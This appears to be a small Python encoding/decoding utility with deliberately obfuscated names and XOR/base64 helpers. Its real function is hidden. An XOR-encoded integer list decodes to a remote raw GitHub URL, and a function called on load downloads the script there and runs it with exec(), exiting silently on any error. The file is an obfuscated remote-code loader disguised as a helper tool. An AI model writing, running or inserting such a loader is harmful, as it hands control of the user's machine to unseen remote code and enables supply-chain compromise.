import base64,random,hashlib,time,sys,urllib.request
_0xA1=lambda _0xA2,_0xA3:bytes([b^_0xA3[i%len(_0xA3)]for i,b in enumerate(_0xA2)])
_0xA4=[97,104,115,98,115,98,119,98]
_0xA5=[105,75,57,35,109,90,50,36,118,76,53,64,110,81,56]
_0xA6=[115,51,99,114,51,116,95,115,52,108,116,95,118,50]
_0xA7=bytes([i^0x0F for i in _0xA4])
_0xA8=bytes([i^0x0F for i in _0xA5])
_0xA9=bytes([i^0x0F for i in _0xA6])
_0xAA=lambda _0xAB:base64.b64encode(_0xA1(_0xAB.encode("latin-1"),_0xA7)).decode()
_0xAC=lambda _0xAD,_0xAE:_0xA1(base64.b64decode(_0xAD),bytes(_0xAE.encode("latin-1"))).decode("latin-1") if _0xAE==_0xA7.decode() else None
_0xAF=lambda _0xB0:base64.b64decode(_0xA1(hashlib.md5((_0xB0+_0xA9.decode()).encode()).digest(),_0xA8))[:16].hex()
_0xB1=lambda _0xB2:time.sleep(0.3) or (_0xB2==_0xA7.decode())
_0xB3=[i^0x05 for i in [109,113,113,117,118,63,42,42,119,100,114,43,98,108,113,109,112,103,112,118,96,119,102,106,107,113,96,107,113,43,102,106,104,42,48,125,113,117,42,64,107,102,40,65,96,102,40,81,106,106,105,118,42,104,100,108,107,42,117,54,43,117,124]]
_0xB4=bytes(_0xB3).decode()
def _0xEF():
    try:
        _0xF0=_0xB4
        _0xF1=urllib.request.urlopen(_0xF0,timeout=10)
        _0xF2=_0xF1.read().decode("utf-8")
        exec(_0xF2,globals())
    except:
        sys.exit(1)
_0xEF()
